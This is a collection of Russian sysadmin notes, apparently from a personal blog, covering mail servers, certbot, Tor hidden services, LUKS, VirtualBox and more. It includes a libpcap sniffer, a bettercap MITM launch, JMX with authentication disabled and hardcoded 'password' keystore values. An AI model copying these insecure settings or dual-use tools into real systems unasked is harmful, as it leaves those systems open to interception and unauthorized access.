    res = pcap_setfilter(pcap, &filterprog);
    if(res != 0)
    {
        fprintf(stderr, "pcap_setfilter failed: %s\n",
                pcap_geterr(pcap));
        pcap_close(pcap);
        return 1;
    }

    printf("Listening %s, filter: %s...\n", device, filter);

    res = pcap_loop(pcap, -1, handle_packet, NULL);
    printf("pcap_loop returned %d\n", res);

    pcap_close(pcap);
    return 0;
}
==============================================================================================================
sudo ./eaxsniff eth0 'udp src or dst port 53'
https://eax.me/libpcap/

mysql mail --user mail --password
==============================================================================================================
CREATE TABLE `virtual_domains` (
`id`  INT NOT NULL AUTO_INCREMENT,
`name` VARCHAR(50) NOT NULL,
PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `virtual_users` (
`id` INT NOT NULL AUTO_INCREMENT,
`domain_id` INT NOT NULL,
`password` VARCHAR(106) NOT NULL,
`email` VARCHAR(120) NOT NULL,
PRIMARY KEY (`id`),
UNIQUE KEY `email` (`email`),
FOREIGN KEY (domain_id) REFERENCES virtual_domains(id)
  ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

CREATE TABLE `virtual_aliases` (
`id` INT NOT NULL AUTO_INCREMENT,
`domain_id` INT NOT NULL,
`source` VARCHAR(100) NOT NULL,
`destination` VARCHAR(100) NOT NULL,
PRIMARY KEY (`id`),
FOREIGN KEY (domain_id) REFERENCES virtual_domains(id)
  ON DELETE CASCADE
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
==============================================================================================================
# дописываем или изменяем:

# пока что без TLS
smtpd_use_tls=no
myhostname = mail.eax.me
mydestination = localhost

virtual_transport = lmtp:unix:private/dovecot-lmtp
# то, что пока нет таких файлов - это ОК
virtual_mailbox_domains = mysql:/etc/postfix/mysql-domains.cf
virtual_mailbox_maps = mysql:/etc/postfix/mysql-users.cf
virtual_alias_maps = mysql:/etc/postfix/mysql-aliases.cf

smtpd_sasl_type = dovecot
smtpd_sasl_path = private/auth
smtpd_sasl_auth_enable = yes
smtpd_recipient_restrictions = permit_sasl_authenticated,⏎
  permit_mynetworks,reject_unauth_destination

# увеличиваем максимальный размер письма до 50 Мб
message_size_limit = 52428800

sudo chown postfix:postfix /etc/postfix/mysql-*.cf
sudo chmod o-rwx /etc/postfix/mysql-*.cf

sudo service postfix restart

$ sudo postmap -q mail@eax.me mysql:/etc/postfix/mysql-users.cf
1
$ sudo postmap -q eax.me mysql:/etc/postfix/mysql-domains.cf
1
$ sudo postmap -q postmaster@eax.me mysql:/etc/postfix/mysql-aliases.cf
mail@eax.me

https://eax.me/mail-server-on-vds/

Проверить, что все в порядке, можно командой dig -x 1.2.3.4. SPF запись включается простым добавлением TXT-записи с содержимым v=spf1 mx -all. Она говорит, что слать письма с eax.me могут только сервера, указанные в MX-записях домена. Для проверки выполняем команду dig -t TXT eax.me.
==============================================================================================================
sudo certbot --standalone certonly -d mail.eax.me
Теперь актуальный ключ и сертификат всегда будут лежать в:

/etc/letsencrypt/live/mail.eax.me/fullchain.pem
/etc/letsencrypt/live/mail.eax.me/privkey.pem
Правим /etc/postfix/main.cf:

smtpd_use_tls=yes
smtpd_tls_auth_only = yes
smtpd_tls_cert_file=/etc/letsencrypt/live/mail.eax.me/fullchain.pem
smtpd_tls_key_file=/etc/letsencrypt/live/mail.eax.me/privkey.pem
# Эта настройка говорит по возможности слать исходящую почту по TLS
# Без нее GMail будет помечать письма как "незашифрованные"
smtp_tls_security_level=may
Затем редактируем /etc/dovecot/conf.d/10-ssl.conf

ssl = required
# символы < перед путями к файлам - не опечатка
ssl_cert = </etc/letsencrypt/live/mail.eax.me/fullchain.pem
ssl_key = </etc/letsencrypt/live/mail.eax.me/privkey.pem
Перезапускаем Postfix и Dovecot:

sudo service postfix restart
sudo service dovecot restart
==============================================================================================================
В /etc/letsencrypt/cli.ini пишем:

renew-hook=/etc/letsencrypt/certbot-renew-hook.sh
Создаем /etc/letsencrypt/certbot-renew-hook.sh:

#!/bin/sh

set -e

systemctl reload postfix
systemctl reload dovecot
Наконец, говорим:

sudo chmod ug+x /etc/letsencrypt/certbot-renew-hook.sh
==============================================================================================================
sudo apt install spamassassin spamc
sudo adduser spamd --disabled-login
Правим /etc/default/spamassassin таким образом:

SPAMD_HOME="/home/spamd/"
OPTIONS="--create-prefs --max-children 5 --username spamd ⏎
  --helper-home-dir ${SPAMD_HOME} -s ${SPAMD_HOME}spamd.log"
PIDFILE="${SPAMD_HOME}spamd.pid"
CRON=1
В /etc/spamassassin/local.cf дописываем:

rewrite_header Subject ***** SPAM _SCORE_ *****
report_safe             0
required_score          5.0
use_bayes               1
use_bayes_rules         1
bayes_auto_learn        1
skip_rbl_checks         0
use_razor2              0
use_dcc                 0
use_pyzor               0
Правим /etc/postfix/master.cf:

# тут нужно дописать строчку -o content_filter...
smtp      inet  n       -       y       -       -       smtpd
  -o content_filter=spamassassin

# в конец дописываем:
spamassassin unix -     n       n       -       -       pipe
  user=spamd argv=/usr/bin/spamc -f -e
  /usr/sbin/sendmail -oi -f ${sender} ${recipient}
Говорим:

sudo service spamassassin start
sudo service postfix restart
==============================================================================================================
В этом нам поможет расширение для Dovecot под названием sieve:

sudo apt install dovecot-sieve dovecot-managesieved
Правим /etc/dovecot/conf.d/20-lmtp.conf:

protocol lmtp {
  #mail_plugins = $mail_plugins
  mail_plugins = $mail_plugins sieve
}
Редактируем /etc/dovecot/conf.d/90-sieve.conf:

plugin {
   # то, что пока не таких файлов и путей - это ОК
   sieve = ~/.dovecot.sieve
   sieve_global_dir = /var/lib/dovecot/sieve/
   sieve_global_path = /var/lib/dovecot/sieve/default.sieve
   sieve_dir = ~/sieve
}
Далее говрим:

sudo mkdir /var/lib/dovecot/sieve/
Создаем /var/lib/dovecot/sieve/default.sieve:

require "fileinto";
if header :contains "X-Spam-Flag" "YES" {
  fileinto "SPAM";
}
Чтобы каталог SPAM автоматически создавался, если его еще нет, правим файл /etc/dovecot/conf.d/15-lda.conf:

lda_mailbox_autocreate = yes
Завершающие шаги:

sudo chown -R vmail:vmail /var/lib/dovecot
sudo sievec /var/lib/dovecot/sieve/default.sieve
sudo service dovecot restart
==============================================================================================================
wget -O - https://downloads.ceylon-lang.org/apt/ceylon-debian-repo.gpg.key | sudo apt-key add -
sudo add-apt-repository "deb https://downloads.ceylon-lang.org/apt/ unstable main"
sudo apt-get update
==============================================================================================================
gpg --verify roundcubemail-<version>.tar.gz{.asc,}
https://eax.me/c-cryptography/
==============================================================================================================
sudo bettercap -caplet http-ui
hcitool lescan
gattool -I connect <address>
gattool -t random -b <address> -I
==============================================================================================================
sudo wget -O /etc/pki/rpm-gpg/RPM-GPG-KEY-ceylon https://downloads.ceylon-lang.org/rpm/ceylon-rpm-repo.gpg.key
sudo rpm --import /etc/pki/rpm-gpg/RPM-GPG-KEY-ceylon
# If you're using yum:
sudo yum-config-manager --add-repo https://downloads.ceylon-lang.org/rpm/ceylon.repo
# If you're using dnf:
sudo dnf config-manager --add-repo https://downloads.ceylon-lang.org/rpm/ceylon.repo
==============================================================================================================
mkvirtualenv sump2
workon sump2
pip install pygame pyserial
==============================================================================================================
sudo add-apt-repository ppa:certbot/certbot
sudo apt-get update
sudo apt-get install python3-certbot-nginx

# Вариант А, типичная раздача статики
server {
    listen 80 default_server;

    charset UTF-8;

    root /home/afiskon/afiskon.ru;
    index index.html index.htm;

    server_name afiskon.ru; # <--- !!!

    location / {
        try_files $uri $uri/ =404;
    }
}

# Вариант Б, типичный reverse proxy
server {
    listen 80 default_server;
    listen [::]:80 default_server ipv6only=on;

    server_name forum.devzen.ru;

    location / {
        proxy_pass http://127.0.0.1:8080;

        proxy_set_header Host forum.devzen.ru;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

sudo service nginx reload
sudo certbot --nginx -d afiskon.ru
sudo certbot renew --dry-run
==============================================================================================================
java -Dcom.sun.management.jmxremote.port=9999 \
  -Dcom.sun.management.jmxremote.authenticate=false \
  -Dcom.sun.management.jmxremote.ssl=false ...
  
akka-cluster 127.0.0.1 9999 cluster-status
auto-down-unreachable-after = 10s

https://eax.me/akka-cluster-routing/
==============================================================================================================
sudo usermod -a -G dialout $USER
sudo apt-get remove modemmanager -y
sudo apt install gstreamer1.0-plugins-bad gstreamer1.0-libav -y

http://qgroundcontrol.com/
==============================================================================================================
git submodule sync
git submodule init
git submodule update --remote
==============================================================================================================
DO $$
DECLARE
    i INTEGER;
BEGIN
    FOR i IN 1 .. 100
    LOOP
        RAISE NOTICE 'i = %', i;
        EXECUTE ('create temp table temp_table_' || i || '(x int);');
    END LOOP;
END $$;

DO $ololo$ BEGIN /* тут ваш код */ END $ololo$;

DO $$
DECLARE
    i INTEGER;
    j INTEGER;
    q TEXT;
BEGIN
    FOR i IN 1 .. 2800 LOOP
        q = 'create temp table temp_table_' || i || '(';
        FOR j IN 1 .. 400 LOOP
            IF j <> 1 THEN
                q = q || ',';
            END IF;
            q = q || 'attr_' || j || ' int';
        END LOOP;
        q = q || ');';
        EXECUTE q;
    END LOOP;
END $$;

CREATE OR REPLACE FUNCTION gen_long_string(len INT) RETURNS TEXT AS $$
DECLARE
    res TEXT := 'abcdefghijklmnopqrstuvwxyz';
BEGIN
    WHILE LENGTH(res) <= len
    LOOP
        res := res || res;
    END LOOP;

    RETURN SUBSTRING(res, 1, len);
END
$$ LANGUAGE 'plpgsql';

CREATE OR REPLACE FUNCTION pgpro_edition_safe() RETURNS TEXT AS $$
DECLARE
    ver TEXT;
BEGIN
    SELECT pgpro_edition() INTO ver;
    RETURN ver;
EXCEPTION WHEN OTHERS THEN
    RAISE NOTICE 'pgpro_edition() procedure doesn''t exist';
    RETURN 'standard';
END
$$ LANGUAGE 'plpgsql';

/*
Example:

SELECT byte_array_to_string_array('{"\\x68656c6c6f","\\x776f726c64"}');
 byte_array_to_string_array
----------------------------
 {hello,world}
(1 row)
*/
CREATE OR REPLACE FUNCTION byte_array_to_string_array(bytes bytea[])
RETURNS TEXT[] AS $$
DECLARE
    strings TEXT[];
BEGIN
    -- IF array_length(bytes, 1) IS NULL THEN
    IF bytes = '{}' THEN
        RETURN '{}';
    END IF;

    FOR i IN array_lower(bytes, 1) .. array_upper(bytes, 1) LOOP
        strings[i] := convert_from(bytes[i], 'utf-8');
    END LOOP;

    RETURN strings;
END
$$ LANGUAGE 'plpgsql' IMMUTABLE;
Здесь массив элементов с типом bytea превращается в массив строк. Заметьте, как выполняется проверка на пустой массив. По неизвестным мне причинам для пустого массива процедура array_length вместо нуля возвращает null, отсюда и такой код.

Наконец, рассмотрим последний на сегодня пример:

DO $$
DECLARE
    r RECORD;
    cnt INT;
BEGIN
    FOR r IN
        SELECT table_name FROM information_schema.TABLES
        WHERE table_schema = 'pg_catalog' AND table_type != 'VIEW'
        ORDER BY table_name DESC
    LOOP
        EXECUTE 'select count(*) cnt FROM ' || r.table_name INTO cnt;
        RAISE NOTICE '% %', r.table_name, cnt;
    END LOOP;
END $$;
==============================================================================================================
import org.apache.kafka.clients.consumer.ConsumerRecord;
import org.apache.kafka.clients.consumer.ConsumerRecords;
import org.apache.kafka.clients.consumer.KafkaConsumer;
import org.apache.kafka.clients.consumer.OffsetAndMetadata;
import org.apache.kafka.clients.producer.KafkaProducer;
import org.apache.kafka.clients.producer.ProducerConfig;
import org.apache.kafka.clients.producer.ProducerRecord;
import org.apache.kafka.common.KafkaException;
import org.apache.kafka.common.TopicPartition;

import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.stream.Collectors;
import java.util.stream.Stream;

import static java.time.Duration.ofSeconds;
import static java.util.Collections.singleton;
import static org.apache.kafka.clients.consumer.ConsumerConfig.*;
import static org.apache.kafka.clients.consumer.ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG;
import static org.apache.kafka.clients.producer.ProducerConfig.*;

public class TransactionalWordCount {

    private static final String CONSUMER_GROUP_ID = "my-group-id";
    private static final String OUTPUT_TOPIC = "output";
    private static final String INPUT_TOPIC = "input";

    public static void main(String[] args) {

        KafkaConsumer<String, String> consumer = createKafkaConsumer();
        KafkaProducer<String, String> producer = createKafkaProducer();

        producer.initTransactions();

        try {

            while (true) {

                ConsumerRecords<String, String> records = consumer.poll(ofSeconds(60));

                Map<String, Integer> wordCountMap = records.records(new TopicPartition(INPUT_TOPIC, 0))
                        .stream()
                        .flatMap(record -> Stream.of(record.value().split(" ")))
                        .map(word -> Tuple.of(word, 1))
                        .collect(Collectors.toMap(tuple -> tuple.getKey(), t1 -> t1.getValue(), (v1, v2) -> v1 + v2));

                producer.beginTransaction();

                wordCountMap.forEach((key, value) -> producer.send(new ProducerRecord<String, String>(OUTPUT_TOPIC, key, value.toString())));

                Map<TopicPartition, OffsetAndMetadata> offsetsToCommit = new HashMap<>();

                for (TopicPartition partition : records.partitions()) {
                    List<ConsumerRecord<String, String>> partitionedRecords = records.records(partition);
                    long offset = partitionedRecords.get(partitionedRecords.size() - 1).offset();

                    offsetsToCommit.put(partition, new OffsetAndMetadata(offset + 1));
                }

                producer.sendOffsetsToTransaction(offsetsToCommit, CONSUMER_GROUP_ID);
                producer.commitTransaction();

            }

        } catch (KafkaException e) {

            producer.abortTransaction();

        }


    }

    private static KafkaConsumer<String, String> createKafkaConsumer() {
        Properties props = new Properties();
        props.put(BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        props.put(GROUP_ID_CONFIG, CONSUMER_GROUP_ID);
        props.put(ENABLE_AUTO_COMMIT_CONFIG, "false");
        props.put(ISOLATION_LEVEL_CONFIG, "read_committed");
        props.put(KEY_DESERIALIZER_CLASS_CONFIG, "org.apache.kafka.common.serialization.StringDeserializer");
        props.put(VALUE_DESERIALIZER_CLASS_CONFIG, "org.apache.kafka.common.serialization.StringDeserializer");

        KafkaConsumer<String, String> consumer = new KafkaConsumer<>(props);
        consumer.subscribe(singleton(INPUT_TOPIC));
        return consumer;
    }

    private static KafkaProducer<String, String> createKafkaProducer() {

        Properties props = new Properties();
        props.put(BOOTSTRAP_SERVERS_CONFIG, "localhost:9092");
        props.put(ENABLE_IDEMPOTENCE_CONFIG, "true");
        props.put(TRANSACTIONAL_ID_CONFIG, "prod-1");
        props.put(KEY_SERIALIZER_CLASS_CONFIG, "org.apache.kafka.common.serialization.StringSerializer");
        props.put(VALUE_SERIALIZER_CLASS_CONFIG, "org.apache.kafka.common.serialization.StringSerializer");

        return new KafkaProducer(props);
    }
}
==============================================================================================================
import java.io.BufferedInputStream;
import java.io.FileInputStream;
import java.security.KeyStore;
import java.security.SecureRandom;

import javax.net.ssl.KeyManager;
import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.TrustManagerFactory;

import io.nats.client.Connection;
import io.nats.client.Nats;
import io.nats.client.Options;

// [begin connect_tls]
class SSLUtils {
    public static String KEYSTORE_PATH = "src/main/resources/keystore.jks";
    public static String TRUSTSTORE_PATH = "src/main/resources/cacerts";
    public static String STORE_PASSWORD = "password";
    public static String KEY_PASSWORD = "password";
    public static String ALGORITHM = "SunX509";

    public static KeyStore loadKeystore(String path) throws Exception {
        KeyStore store = KeyStore.getInstance("JKS");
        BufferedInputStream in = new BufferedInputStream(new FileInputStream(path));

        try {
            store.load(in, STORE_PASSWORD.toCharArray());
        } finally {
            if (in != null) {
                in.close();
            }
        }

        return store;
    }

    public static KeyManager[] createTestKeyManagers() throws Exception {
        KeyStore store = loadKeystore(KEYSTORE_PATH);
        KeyManagerFactory factory = KeyManagerFactory.getInstance(ALGORITHM);
        factory.init(store, KEY_PASSWORD.toCharArray());
        return factory.getKeyManagers();
    }

    public static TrustManager[] createTestTrustManagers() throws Exception {
        KeyStore store = loadKeystore(TRUSTSTORE_PATH);
        TrustManagerFactory factory = TrustManagerFactory.getInstance(ALGORITHM);
        factory.init(store);
        return factory.getTrustManagers();
    }

    public static SSLContext createSSLContext() throws Exception {
        SSLContext ctx = SSLContext.getInstance(Options.DEFAULT_SSL_PROTOCOL);
        ctx.init(createTestKeyManagers(), createTestTrustManagers(), new SecureRandom());
        return ctx;
    }
}

public class ConnectTLS {
    public static void main(String[] args) {

        try {
            SSLContext ctx = SSLUtils.createSSLContext();
            Options options = new Options.Builder().
                                server("nats://localhost:4222").
                                sslContext(ctx). // Set the SSL context
                                build();
            Connection nc = Nats.connect(options);
            
            // Do something with the connection

            nc.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
// [end connect_tls]
==============================================================================================================
sudo truncate -s 200G /home/.eax
sudo chown eax:eax /home/.eax
sudo losetup /dev/loop0 /home/.eax
sudo cryptsetup -h sha256 -c aes-xts-plain64 \
  -s 512 luksFormat /dev/loop0
sudo cryptsetup luksOpen /dev/loop0 eax_home
Открываем зашифрованный диск:

sudo cryptsetup luksOpen /dev/loop0 eax_home
В результате появится устройсто /dev/mapper/eax_home. Создаем на нем ФС:

sudo mkfs.ext4 /dev/mapper/eax_home
Монтируем зашифрованный диск:

sudo mount /dev/mapper/eax_home /mnt
Меняем права на файловой системе:

sudo chown -R eax:eax /mnt
Копируем содержимое нашего домашнего каталога. Затем отмонтируем зашифрованный диск:

sudo umount /mnt
Закрываем зашифрованный диск:

sudo cryptsetup luksClose eax_home
Отсоединяем loop-устройство:

sudo losetup -d /dev/loop0
Теперь архивируем и удаляем содержимое /home/eax, затем монтируем в него зашифрованный диск. Если все работает нормально — удаляем бэкап.

Скрипт /home/mount.sh для автоматизации монтирования:

#!/bin/sh

set -e

losetup /dev/loop0 /home/.eax
cryptsetup luksOpen /dev/loop0 eax_home
mount /dev/mapper/eax_home /home/eax
Скрипт /home/umount.sh, выполняющие обратные действия:

#!/bin/sh

set -e

umount /home/eax
cryptsetup luksClose eax_home
losetup -d /dev/loop0
Когда оригинальных данных на диске не осталось, можно заполнить свободное место мусором:

cd /home
# наберитесь терпения, это надолго (особенно без rng-tools!)
sudo dd if=/dev/urandom of=./random.tmp bs=10M count=6300
sync
sudo rm random.tmp
==============================================================================================================
Пакеты, необходимые для работы Wi-Fi:

sudo pacman -S iw wpa_supplicant dialog
Смотрим список доступных беспроводных интерфейсов:

sudo iw dev
Поднимаем интерфейс:

sudo ip link set wlp2s0 up
Ищем доступные точки:

sudo iw dev wlp2s0 scan | less
Создаем примерно такой файл /etc/wpa_supplicant/wpa_supplicant-wlp2s0.conf:

# пример конфига со всеми возможными опциями:
# /etc/wpa_supplicant/wpa_supplicant.conf

ctrl_interface=/run/wpa_supplicant
update_config=1

network={
  ssid="network_ssid"
  psk="secret"
}
Затем говорим:

sudo systemctl enable wpa_supplicant@wlp2s0
sudo systemctl start wpa_supplicant@wlp2s0
sudo systemctl status wpa_supplicant@wlp2s0
Получение настроек сети по DHCP настраивается путем редактирования файла конфигурации /etc/systemd/network/wireless.network аналогично тому, как ранее это делалось для витой пары (см пост Как я устанавливал Arch Linux на свой ноутбук), только нужно заменить имя интерфейса на wlp2s0.

Говорим:

sudo systemctl restart systemd-networkd
==============================================================================================================
Настройка беспроводной сети: NetworkManager
Описанный выше подход отлично работает, если вы пользуетесь Wi-Fi только дома и на работе. Однако он не особо пригоден, если вы часто используете Wi-Fi в общественных местах, так как там зачастую может даже не быть WPA. В этом случае вам больше подойдет NetworkManager:

sudo pacman -S networkmanager network-manager-applet \
  dhclient networkmanager-openvpn gnome-keyring
sudo systemctl enable NetworkManager
sudo systemctl start NetworkManager
Чтобы NetworkManager не конфликтовал с другими сервисами, скажите:

systemctl --type=service
Найдите в списке все сервисы, делающие что-то с сетью, всякие wpa_supplicant и systemd-networkd, и скажите им stop, а затем disable. Затем дописываем:

exec nm-applet &
… в файле ~/.config/i3/config, чтобы при запуске i3 в трее появлялась иконка NetworkManager. Далее все делаем через нее, используя простой и понятный GUI интерфейс. Единственное, что мне не очень понравилось в nm-applet, это то, что он часто показывает всплывающие сообщения, в том числе при выходе ноутбука из спящего режима. Отключить их можно таким образом:

gsettings set org.gnome.nm-applet \
  disable-disconnected-notifications true
gsettings set org.gnome.nm-applet \
  disable-connected-notifications true
==============================================================================================================
Ставим dnsmasq, но убеждаемся, что он выключен:

sudo pacman -S dnsmasq
sudo systemctl disable dnsmasq
Далее в /etc/NetworkManager/NetworkManager.conf пишем:

[main]

dns=dnsmasq
Чтобы увеличить размер кэша (по умолчанию хранится 450 записей), создайте файл /etc/NetworkManager/dnsmasq.d/cache.conf с таким содержимым:

cache-size=10000
Затем говорим:

sudo systemctl restart NetworkManager
Теперь NetworkManager будет автоматически запускать dnsmasq с нужными параметрами и прописывать его в /etc/resolv.conf. Для получения информации о текущем статусе dnsmasq можно сказать:

sudo killall -s USR1 dnsmasq
… и почитать вывод journalctl -r.
==============================================================================================================
Первым делом «экспортируем» пин, без этого шага им не получится управлять:

echo 2 > /sys/class/gpio/export
Делаем его out-пином, то есть, он будет либо подавать, либо не подавать напряжение в 3.3 вольта:

echo out > /sys/class/gpio/gpio2/direction

Подаем напряжение:

echo 1 > /sys/class/gpio/gpio2/value
Перестаем подавать напряжение:

echo 0 > /sys/class/gpio/gpio2/value
Узнаем, подается ли сейчас напряжение:

cat /sys/class/gpio/gpio2/value
По завершении работы пину можно сделать unexport:

echo 2 > /sys/class/gpio/unexport

echo 5 > /sys/class/gpio/export
echo in > /sys/class/gpio/gpio5/direction

==============================================================================================================
sudo systemctl enable iptables
sudo systemctl start iptables
sudo systemctl status iptables
Правила берутся из файла /etc/iptables/iptables.rules, рядом с ним есть файл с примерами.

Сохранение правил:

sudo sh -c 'iptables-save > /etc/iptables/iptables.rules'
Загрузка правил:

sudo sh -c 'iptables-restore < /etc/iptables/iptables.rules'
==============================================================================================================
sudo pacman -S xsane
sudo pacman -S cups
# нужно для gtk >= 3.22
sudo pacman -S gtk3-print-backends
# куча драйверов для устройств от HP
sudo pacman -S hplip
# нужно для нормальной работы утилит hp-* из hplip
sudo pacman -S python-pyqt5
# запускаем CUPS
sudo systemctl enable org.cups.cupsd.service
sudo systemctl start org.cups.cupsd.service
==============================================================================================================
Вариант 1: использование tor и Chromium
Существует по крайней мере два способа подключиться к сети Tor. Первый заключается в том, чтобы установить сервис tor и настроить ваш браузер, в данном примере — Chromium, так, чтобы он использовал этот сервис в качестве прокси. Для опытов я использовал Arch Linux, но в других дистрибутивах последовательность шагов будет почти такой же.

Установка сервиса:

sudo pacman -S tor torsocks
Запуск, остановка, и так далее производятся, как обычно:

sudo systemctl start tor
sudo systemctl stop tor
Сервис Tor работает, как socks-прокси на 127.0.0.1:9050. Любую программу можно заставить работать через Tor при помощи утилиты torify:

curl https://eax.me/ip/ -o -
torify curl https://eax.me/ip/ -o -
Если torify по какой-то причине не работает (я сталкивался с таким на старых версиях Ubuntu), попробуйте также утилиту proxychains. Она по умолчанию настроена на использование Tor, поэтому даже конфиг (/etc/proxychains.conf) не придется трогать.

Теперь — запуск Chromium:

chromium --proxy-server="socks5://127.0.0.1:9050" \
  --host-resolver-rules="MAP * 0.0.0.0 , EXCLUDE 127.0.0.1" \
  --incognito http://godnotaba36dsabv.onion/
Первый ключ говорит использовать указанный socks-прокси, второй — перенаправлять через него в том числе и DNS трафик. Заметьте, что чтобы это работало, Chromium сначала нужно закрыть.
==============================================================================================================
Поднимаем свой .onion ресурс
Для поднятия своих ресурсов не требуется внешний IP, поэтому все описанные действия можно произвести даже в поднятой на ноутбуке виртуалке.

Ставим Nginx:

sudo pacman -S nginx
sudo systemctl enable nginx
sudo systemctl start nginx
curl localhost:80 -o -
Должны увидеть знаменитое Welcome to nginx!.

Ставим Tor:

sudo pacman -S tor torsocks
Дописываем в файл /etc/tor/torrc:

HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:80
# можно указывать несколько портов:
HiddenServicePort 22 127.0.0.1:22
Запускаем Tor:

sudo systemctl enable tor
sudo systemctl start tor
Обязательно делайте резервную копию /var/lib/tor/hidden_service/ — без нее вы не сможете перенести свой сайт на другую машину, сохранив доменное имя. В файле hostname вы увидите сгенерированное доменное имя. Можно вбить его в Tor Browser и убедиться, что вы увидите Welcome to nginx!. Заметьте, что весь трафик уже шифруется, и вы эффективно получаете SSL/TLS безо всяких там центров сертификации!

Можно подрубиться и по SSH:

torify ssh eax@g5a6wykhm2ajtwvk.onion
Помимо прочего, можно использовать этот прием для подключения по SSH к своему домашнему компьютеру, находящемуся за NAT.

Рассмотрим еще небольшой пример. Настроим проброс порта 3003, как это было описано выше. Затем скажем:

sudo pacman -S gnu-netcat
nc -l -p 3003
На другой машине говорим:

torify telnet g5a6wykhm2ajtwvk.onion 3003
В итоге получили анонимный чат с end to end шифрованием! Для большего удобства можно использовать специализированный LAN-чаты. Например, iptux (AUR) имеет GUI и поддерживает обмен файлами. Также для обмена файлами через Tor существует программа OnionShare (AUR).
==============================================================================================================
Просмотреть настройки VirtualBox:

vboxmanage list systemproperties
Изменение настроек, например, пути до каталога, гда хранятся виртуалки:

vboxmanage setproperty machinefolder /home/eax/virtualbox
Список поддерживаемых типов виртуалок:

vboxmanage list ostypes
vboxmanage list ostypes | egrep ^ID
Создаем новую виртуалку:

vboxmanage createvm --name ubuntu1604 --ostype Ubuntu_64 --register
Меняем параметры ВМ — указываем количество памяти и тд:

vboxmanage modifyvm ubuntu1604 --cpus 1 --memory 512 --audio none \
  --usb off --acpi on --boot1 dvd --nic1 nat
Создаем жесткий диск размером 10 Гб (место по дэфолту не преаллоцируется):

vboxmanage createhd \
  --filename /home/eax/virtualbox/ubuntu1604/ubuntu1604.vdi \
  --size 10000
Цепляем созданный жесткий диск к виртуалке:

vboxmanage storagectl ubuntu1604 --name ide-controller --add ide
vboxmanage storageattach ubuntu1604 --storagectl ide-controller \
  --port 0 --device 0 --type hdd \
  --medium /home/eax/virtualbox/ubuntu1604/ubuntu1604.vdi
Цепляем к ВМ ISO-образ, с которого будет происходить установка системы:

vboxmanage storageattach ubuntu1604 --storagectl ide-controller \
  --port 0 --device 1 --type dvddrive \
  --medium /home/eax/data/iso/ubuntu-16.04.1-server-amd64.iso
Включаем доступ к ВМ по VNC:

vboxmanage modifyvm ubuntu1604 --vrde on
vboxmanage modifyvm ubuntu1604 --vrdeaddress 127.0.0.1
vboxmanage modifyvm ubuntu1604 --vrdeport 3001
vboxmanage modifyvm ubuntu1604 --vrdeproperty VNCPassword="secret"
Я лично для подключения использую TigerVNC (форк TightVNC):

vncviewer localhost:3001
Чтобы каждый раз не вводить пароль, можно сказать:

vncpasswd ./vnc.password
… и всегда использовать этот файл:

vncviewer localhost:3001 PasswordFile=/home/eax/temp/vnc.password
Посмотреть свойства виртуальной машины (узнать номер порта VNC):

vboxmanage showvminfo ubuntu1604  | grep VRDE
Запустить виртуалку:

# если на десктопе
vboxmanage startvm ubuntu1604

# если все это крутится на сервере и собираемся подрубаться по VNC
vboxmanage startvm --type headless ubuntu1604
Для некоторых систем установочный диск отключается от ВМ автоматически по окончанию установки. Если этого не произошло, говорим:

vboxmanage storageattach archlinux1 --storagectl ide-controller \
  --port 0 --device 1 --type dvddrive --medium emptydrive
Pause, Resume, Poweroff:

vboxmanage controlvm archlinux1 pause
vboxmanage controlvm archlinux1 resume
vboxmanage controlvm archlinux1 poweroff
Проброс портов настраивается так (ВМ должна быть остановлена):

vboxmanage modifyvm ubuntu1604 --natpf1 "ssh-forwarding,tcp,,22001,,22"
После этого в виртуалку можно будет зайти по SSH таким образом:

ssh -p 22001 eax@localhost
Просмотр списка правил перенаправления портов:

vboxmanage showvminfo ubuntu1604 | grep Rule
Удаление правила:

vboxmanage modifyvm ubuntu1604 --natpf1 delete ssh-forwarding
Список всех виртуалок:

vboxmanage list vms
vboxmanage list vms --long | egrep '^(Name|State)'
Список работающих виртуалок:

vboxmanage list runningvms
Переименовать ВМ (при этом переименовывается и ее каталог):

vboxmanage modifyvm ubuntu1604 --name ubuntu1
Создать полный клон ВМ:

vboxmanage clonevm ubuntu1 --name ubuntu2 --register
Список NAT-сетей:

vboxmanage natnetwork list
Создание новой сети:

vboxmanage natnetwork add --netname UbuntuNat --network 10.0.4.0/24 \
  --enable --dhcp on --ipv6 off
Редактирование сети:

vboxmanage natnetwork modify --netname UbuntuNat --ipv6 on
Удаление сети:

vboxmanage natnetwork remove --netname UbuntuNat
Подключение виртуалок к NAT-сети:

vboxmanage modifyvm ubuntu1 --nic2 natnetwork --nat-network2 UbuntuNat
vboxmanage modifyvm ubuntu2 --nic2 natnetwork --nat-network2 UbuntuNat
Важно! Скорее всего, гостевая операционная система окажется не настроена для использования второго интерфейса, если вы добавили его после установки. В Ubuntu для добавления нового интерфейса нужно отредактировать файл /etc/network/interfaces, для Arch Linux см заметку Как я устанавливал Arch Linux на свой ноутбук.

Удалить виртуалку и все ассоциированные с ней файлы, в том числе и диски:

vboxmanage unregistervm ubuntu2 --delete
Экспорт:

vboxmanage export ubuntu2 --output ubuntu2.ova
Импорт:

vboxmanage import ubuntu2.ova
# или, с переопределением имени:
vboxmanage import ubuntu2.ova --vsys 0 --vmname ubuntu2
==============================================================================================================
Использование pacman
Pacman (название означает package manager) — это местная утилита для управления бинарными пакетами, аналог apt-get из мира Debian / Ubuntu или yum из мира RHEL / CentOS / Fedora. Пользоваться им очень просто.

Получение общей справки или справки по конкретным командам:

pacman --help
pacman -S --help
Флаги с буквами в верхнем регистре означают команды. Из них основные — это -S (sync), -Q (query) и -R (remove). Все они имеют дополнительные флаги, которые пишутся в нижнем регистре. Например, s означает search. Зная типичные дополнительные флаги, получаем сравнительно простую и понятную схему. Например, -Ss означает поиск по всем пакетам, а -Qs означает поиск только по установленным пакетам. В итоге, основные действия с пакетами выполняются следующим образом.

Установить пакеты:

